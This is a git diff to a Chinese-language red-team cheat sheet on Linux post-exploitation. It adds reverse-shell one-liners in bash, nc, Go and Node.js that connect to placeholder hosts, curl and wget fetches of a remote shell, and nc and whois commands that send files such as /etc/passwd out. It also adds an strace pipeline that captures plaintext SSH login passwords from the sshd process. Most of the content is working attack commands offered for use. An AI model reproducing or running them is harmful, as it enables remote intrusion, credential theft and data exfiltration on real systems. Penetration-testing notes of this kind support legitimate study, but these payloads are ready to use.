@@ -8,11 +8,6 @@
 
 ---
 
-**渗透框架**
-- [d4rk007/RedGhost](https://github.com/d4rk007/RedGhost) - linux 的后渗透框架,可用于权限维持、提权等操作，半图形化.实际测试感觉不太行。
-
----
-
 # 漏洞利用
 
 - [OS-Exploits](./OS-Exploits.md#Linux)
@@ -23,12 +18,36 @@
 
 `Living Off The Land`
 
+**相关文章**
+- [busybox docker 受限环境下回传文件](https://landgrey.me/blog/3/)
+
 **相关资源**
 - [GTFOBins](https://gtfobins.github.io/)
+
+**查看语言/代码支持情况**
+```bash
+find / -name perl*
+find / -name python*
+find / -name gcc*
+find / -name cc
+```
+
+**查找可利用于传输文件的命令**
+```bash
+find / -name wget
+find / -name nc*
+find / -name netcat*
+find / -name tftp*
+find / -name ftp
+find / -name scp
+```
 
 **相关工具**
 - [sameera-madushan/Print-My-Shell](https://github.com/sameera-madushan/Print-My-Shell) - 自动化生成各种类型的反向 Shell
 - [lukechilds/reverse-shell](https://github.com/lukechilds/reverse-shell) - Reverse Shell as a Service
+- [nodauf/Girsh](https://github.com/nodauf/Girsh) - nc 的替代品
+
+    ![](../../../../assets/img/Security/RedTeam/OS安全/Linux安全/3.png)
 
 **bash**
 - tcp
@@ -86,6 +105,16 @@ Static socat binary can be found at [https://github.com/andrew-d/static-binaries
     export TERM=xterm
     ```
 
+- **文件传输**
+    ```bash
+    # 收
+    nc -nvlp 4444 > aaa
+    ```
+    ```bash
+    # 发
+    nc -nv 192.168.30.35 4444 </usr/share/aaa    # kali
+    ```
+
 **ncat**
 ```bash
 # 被控端
@@ -107,6 +136,16 @@ nc -c bash 10.0.0.1 4242
 **Netcat OpenBsd**
 ```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
+```
+
+**curl**
+```bash
+curl http://1.1.1.1/shell
+```
+
+**wget**
+```bash
+wget http://1.1.1.1/shell
 ```
 
 **perl**
@@ -154,6 +193,27 @@ ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.0.0.1","4242");while(cmd=c.ge
 **Golang**
 ```bash
 echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","10.0.0.1:4242");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
+```
+
+**lambda Node.js**
+```js
+vim shell.js
+
+(function(){
+    var net=require("net"),
+    cp = require("child_process"),
+    sh =  cp.spawn("/bin/sh",[]);
+    var client = new net.Socket();
+    client.connect(8888,"1.1.1.1",function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/;
+})();
+```
+```bash
+node shell.js
 ```
 
 **java**
@@ -215,9 +275,21 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f war > revers
 strings reverse.war | grep jsp # in order to get the name of the file
 ```
 
+**whois**
+
+接收端
+```
+nc -vlnp 1337 | sed "s/ //g" | base64 -d
+```
+
+发送端
+```
+whois -h 127.0.0.1 -p 1337 `cat /etc/passwd | base64`
+```
+
 ---
 
-# 口令破解
+# 认证
 
 **文章**
 - [How to Crack Shadow Hashes After Getting Root on a Linux System](https://null-byte.wonderhowto.com/how-to/crack-shadow-hashes-after-getting-root-linux-system-0186386/)
@@ -226,3 +298,16 @@ strings reverse.war | grep jsp # in order to get the name of the file
 **工具**
 - [huntergregal/mimipenguin](https://github.com/huntergregal/mimipenguin) - 从当前 Linux 用户转储登录密码的工具
 - [Hashcat](../../安全工具/Hashcat.md#爆破shadow文件)
+
+**口令抓取**
+
+当我们拿下 windows 机器时可以通过抓内存中的密码进行横向，但 linux 却不可能抓到内存中的密码，但是 Debian 系列下的 linux 系统可以通过监听 sshd 进程的数据抓取出明文密码，比如你拿下了一台管理员机器，上面由 xshell，你可以手动开一个监听，在开一个登录，监听的窗口上就抓出密码了
+```bash
+strace -xx -fp `cat /var/run/sshd.pid` 2>&1| grep --line-buffered -P 'write\(\d, "\\x00' | perl -lne '$|++; @F=/"\s*([^"]+)\s*"/g;for (@F){tr/\\x//d}; print for @F'|grep --line-buffered -oP '.{8}\K([2-7][0-9a-f])*$'|grep --line-buffered -v '^64$'|perl -pe 's/([0-9a-f]{2})/chr hex $1/gie'
+```
+
+实测 kali、ubuntu 都可以，centos 不行
+
+![](../../../../assets/img/Security/RedTeam/OS安全/Linux安全/1.png)
+
+![](../../../../assets/img/Security/RedTeam/OS安全/Linux安全/2.png)
